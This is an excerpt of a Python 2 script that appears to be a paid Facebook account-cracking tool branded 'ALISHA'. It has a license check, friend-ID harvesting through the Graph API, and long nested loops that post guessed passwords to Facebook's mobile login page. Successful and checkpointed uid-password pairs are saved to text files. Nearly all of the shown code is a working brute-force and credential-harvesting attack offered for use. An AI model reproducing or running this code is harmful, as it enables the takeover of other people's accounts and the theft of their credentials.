...
logo = "'\x1b[1;92m'  █████╗ ██╗     ██╗███████╗██╗  ██╗ █████╗\n'\x1b[1;92m'██╔══██╗██║     ██║██╔════╝██║  ██║██╔══██╗\n'\x1b[1;91m'   ███████║██║     ██║███████╗███████║███████║ \n'\x1b[1;97m'     \n'\x1b[1;93m'  ██╔══██║██║     ██║╚════██║██╔══██║██╔══██║\n'\x1b[1;94m' ██║  ██║███████╗██║███████║██║  ██║██║  ██║ \n\n'\x1b[1;91m'   Author      :     ALISHA     \n'\x1b[1;92m'   Github      :     NOT AVALIABLE  \n'\x1b[1;93m'   FB ID       :     NOT AVAIL\n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;96m'   WAP NUMBER  :     03097156348            \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    r1 = requests.get('https://github.com/ChuzziDoll787/Alisha_Paid/blob/main/server.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In ALISHA Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ALISHA-OK] ' + coc + user + ' | ' + pass1
                ok = open('alisha random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[ALISHA-CP] ' + coc + user + ' | ' + pass1
                cp = open('alisha random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From ALISHA : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ALISHA-OK] ' + uid + ' | ' + pass1
                ok = open('ALISHA-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[ALISHA-CP] ' + uid + ' | ' + pass1
                cp = open('ALISHA-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[ALISHA-OK] ' + uid + ' | ' + pass2
                    ok = open('ALISHA-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[ALISHA-CP] ' + uid + ' | ' + pass2
                    cp = open('ALISHA-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[ALISHA-OK] ' + uid + ' | ' + pass3
                        ok = open('ALISHA-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[ALISHA-CP] ' + uid + ' | ' + pass3
                        cp = open('ALISHA-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[ALISHA-OK] ' + uid + ' | ' + pass4
                            ok = open('ALISHA-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ALISHA-CP] ' + uid + ' | ' + pass4
                            cp = open('ALISHA-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[ALISHA-OK] ' + uid + ' | ' + pass5
                                ok = open('ALISHA-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[ALISHA-CP] ' + uid + ' | ' + pass5
                                cp = open('ALISHA-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[ALISHA-OK] ' + uid + ' | ' + pass6
                                    ok = open('ALISHA-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[ALISHA-CP] ' + uid + ' | ' + pass6
                                    cp = open('ALISHA-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
